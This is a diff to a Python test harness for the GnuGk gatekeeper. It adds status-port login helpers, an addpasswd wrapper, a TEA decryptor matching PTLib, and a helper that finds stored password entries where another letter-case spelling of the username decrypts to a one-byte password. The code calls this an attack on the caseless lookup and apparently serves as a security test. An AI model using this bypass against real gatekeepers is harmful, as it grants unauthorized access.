@@ -1,8 +1,11 @@
 """Run GnuGk inside the gk namespace and talk to its status port."""
 
+import base64
 import copy
+import itertools
 import os
 import re
+import struct
 import subprocess
 import time
 
@@ -197,6 +200,19 @@ class StatusSession:
     def send(self, line):
         self.sock.sendall(line.encode() + b"\r\n")
 
+    def login_accepted(self, user, password):
+        """one login attempt, password as raw bytes: True if the session is logged in, False if GnuGk asks again"""
+        self.read_until("login: ")
+        self.send(user)
+        self.read_until("Password: ")
+        self.sock.sendall(password + b"\r\n")
+        try:
+            self.read_until("login: ", timeout=2)	# rejected: asks again
+            return False
+        except TimeoutError:
+            self.send("Statistics")
+            return "-- Endpoint Statistics --" in self.read_until("-- Call Statistics --")
+
     def login(self, user, password):
         self.read_until("login: ")
         self.send(user)
@@ -211,11 +227,74 @@ class StatusSession:
         self.sock.close()
 
 
-def pbkdf2_password(password, salt="0123456789abcdef"):
-    """[GkStatus::Auth] user entry for a password, like addpasswd makes it (PBKDF2-SHA512)"""
-    import hashlib
-    digest = hashlib.pbkdf2_hmac("sha512", password.encode(), salt.encode(), 65536, 32).hex()
-    return "PBKDF2:%s-%s" % (salt, digest)
+def addpasswd(config_file, section, user, password):
+    """run addpasswd for user in section of config_file, return the entry it wrote"""
+    done = subprocess.run([ADDPASSWD, config_file, section, user, password], check=True, capture_output=True, text=True)
+    match = re.search(r"^Setting: (.*?)=(.*)$", done.stdout, re.M)
+    assert match and match.group(1) == user, done.stdout
+    return match.group(2)
+
+
+def status_password(workdir, user, password):
+    """[GkStatus::Auth] entry for user, written by addpasswd (a PBKDF2 digest)"""
+    scratch = os.path.join(workdir, "addpasswd-status.ini")
+    with open(scratch, "w") as f:
+        f.write("[GkStatus::Auth]\n")
+    entry = addpasswd(scratch, "GkStatus::Auth", user, password)
+    assert entry.startswith("PBKDF2:"), "addpasswd built without OpenSSL? %s" % entry
+    return entry
+
+
+def traditional_password(workdir, user, password):
+    """entry for user in the traditional encrypted format, written by addpasswd with padding byte 0 (for
+    [GkStatus::Auth] addpasswd only writes PBKDF2, so this takes another section)"""
+    scratch = os.path.join(workdir, "addpasswd-traditional.ini")
+    with open(scratch, "w") as f:
+        f.write("[Passwords]\n")
+    return addpasswd(scratch, "Passwords", user, password)
+
+
+TEA_DELTA = 0x9E3779B9
+
+
+def tea_decrypt(entry, key, padding_byte=0):
+    """decrypt a traditional entry with key like GnuGk does (PTLib PTEACypher, PCypher::Decode): the bytes
+    up to the first NUL, or None if PTLib refuses the result"""
+    data = base64.b64decode(entry)
+    k = struct.unpack("<4I", (key.encode()[:16] + bytes([padding_byte]) * 16)[:16])
+    mask = 0xFFFFFFFF
+    plain = b""
+    for pos in range(0, len(data), 8):
+        y, z = struct.unpack(">2I", data[pos:pos + 8])
+        total = (TEA_DELTA << 5) & mask
+        for _ in range(32):
+            z = (z - ((((y << 4) + k[2]) ^ (y + total) ^ ((y >> 5) + k[3])) & mask)) & mask
+            y = (y - ((((z << 4) + k[0]) ^ (z + total) ^ ((z >> 5) + k[1])) & mask)) & mask
+            total = (total - TEA_DELTA) & mask
+        plain += struct.pack(">2I", y, z)
+    if not plain or plain[-1] >= 8:
+        return None
+    return plain[:len(plain) - 8 + plain[-1]].split(b"\0")[0]
+
+
+def case_spellings(name):
+    """all upper/lower case spellings of name"""
+    choices = [(c.lower(), c.upper()) if c.isalpha() else (c,) for c in name]
+    return ["".join(spelling) for spelling in itertools.product(*choices)]
+
+
+def entry_with_one_byte_spelling(workdir, user, password, tries=100):
+    """a traditional entry written by addpasswd for which another upper/lower case spelling of user decrypts
+    to a one-byte password a client can send (the attack on the caseless lookup): (entry, spelling, byte).
+    addpasswd pads with random bytes, so it is run until it writes such an entry."""
+    for _ in range(tries):
+        entry = traditional_password(workdir, user, password)
+        assert tea_decrypt(entry, user) == password.encode(), entry	# the decoder matches addpasswd
+        for spelling in case_spellings(user):
+            plain = tea_decrypt(entry, spelling)
+            if spelling != user and plain and len(plain) == 1 and (0x21 <= plain[0] <= 0x7e or 0x80 <= plain[0] <= 0xfe):
+                return entry, spelling, plain
+    raise AssertionError("no entry with a one-byte spelling of %r in %d addpasswd runs" % (user, tries))
 
 
 class GnuGk:
@@ -242,8 +321,7 @@ class GnuGk:
                     f.write("%s=%s\n" % (key, value))
                 f.write("\n")
         for alias, password in (users or {}).items():
-            subprocess.run([ADDPASSWD, self.config_file, "SimplePasswordAuth", alias, password],
-                           check=True, capture_output=True)
+            addpasswd(self.config_file, "SimplePasswordAuth", alias, password)
         self.proc = None
         self.stopped = False	# stop() ended a running GnuGk
 
